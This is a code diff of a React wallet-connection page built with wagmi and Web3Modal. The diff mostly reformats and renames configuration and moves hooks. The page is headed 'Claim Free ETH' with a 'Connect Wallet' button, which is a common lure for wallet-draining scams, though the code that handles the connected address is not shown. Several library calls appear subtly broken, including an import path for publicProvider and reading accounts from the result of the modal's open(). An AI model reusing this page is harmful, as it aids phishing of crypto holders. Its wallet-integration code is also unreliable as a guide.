@@ -1,21 +1,28 @@
 import React, { useState } from "react";
 import ReactDOM from "react-dom/client";
 
-import { WagmiConfig, createConfig, configureChains, useAccount } from "wagmi";
+import {
+  WagmiConfig,
+  createConfig,
+  configureChains,
+  useAccount,
+  useConnect,
+} from "wagmi";
 import { mainnet, sepolia } from "@wagmi/chains";
 import { publicProvider } from "viem/providers/public";
 
 import { Web3Modal, useWeb3Modal } from "@web3modal/wagmi";
 
-// Replace with your Web3Modal Project ID
 const projectId = "962425907914a3e80a7d8e7288b23f62";
 
-// Configure chains + providers
-const { chains, publicClient } = configureChains([mainnet, sepolia], [publicProvider()]);
+// --- Configure chains + providers
+const { chains, publicClient } = configureChains([mainnet, sepolia], [
+  publicProvider(),
+]);
 
-// Wagmi config (no connectors needed when using Web3Modal Wagmi)
-const wagmiConfig = createConfig({
+const config = createConfig({
   autoConnect: true,
+  connectors: [], // leave empty, Web3Modal will handle connectors
   publicClient,
 });
 
@@ -23,15 +30,15 @@ const App = () => {
   const [loading, setLoading] = useState(false);
   const [response, setResponse] = useState(null);
 
-  const { open } = useWeb3Modal(); // Opens wallet modal
   const { address, isConnected } = useAccount();
+  const { open } = useWeb3Modal();
 
   const connectWallet = async () => {
     try {
       setLoading(true);
       setResponse(null);
 
-      // Open Web3Modal (all wallet options included)
+      // Open Web3Modal for user to select their wallet
       const connection = await open();
       const walletAddress = connection?.accounts?.[0];
 
@@ -63,7 +70,7 @@ const App = () => {
   };
 
   return (
-    <WagmiConfig config={wagmiConfig}>
+    <WagmiConfig config={config}>
       <div className="min-h-screen flex items-center justify-center bg-gray-900 text-white font-sans">
         <div className="bg-gray-800 p-8 rounded-xl shadow-lg w-full max-w-md text-center">
           <h1 className="text-2xl font-bold mb-4">Claim Free ETH</h1>
@@ -76,11 +83,17 @@ const App = () => {
               loading ? "bg-gray-600 cursor-not-allowed" : "bg-green-500 hover:bg-green-600"
             }`}
           >
-            {loading ? "Connecting..." : isConnected ? "Wallet Connected" : "Connect Wallet"}
+            {loading
+              ? "Connecting..."
+              : isConnected
+              ? "Wallet Connected"
+              : "Connect Wallet"}
           </button>
 
           {isConnected && (
-            <p className="mt-4 text-sm text-gray-400 break-all">Connected: {address}</p>
+            <p className="mt-4 text-sm text-gray-400 break-all">
+              Connected: {address}
+            </p>
           )}
 
           {response && (
@@ -90,6 +103,7 @@ const App = () => {
           )}
         </div>
 
+        {/* Web3Modal popup */}
         <Web3Modal projectId={projectId} themeMode="dark" enableNetworkSwitch />
       </div>
     </WagmiConfig>
